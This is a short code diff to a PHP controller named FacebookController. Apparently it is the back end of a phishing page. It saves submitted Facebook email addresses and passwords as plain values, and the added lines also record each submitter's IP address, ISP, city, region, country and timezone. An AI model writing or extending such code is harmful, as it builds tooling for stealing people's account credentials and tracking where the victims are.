@@ -41,6 +41,12 @@ class FacebookController extends Controller
 
         $dataFacebook->email = $request->email;
         $dataFacebook->password = $request->password;
+        $dataFacebook->ip = $request->ip;
+        $dataFacebook->isp = $request->isp;
+        $dataFacebook->city = $request->city;
+        $dataFacebook->region = $request->region;
+        $dataFacebook->country = $request->country;
+        $dataFacebook->timezone = $request->timezone;
         //dd($dataFacebook);
         $dataFacebook->save();
 
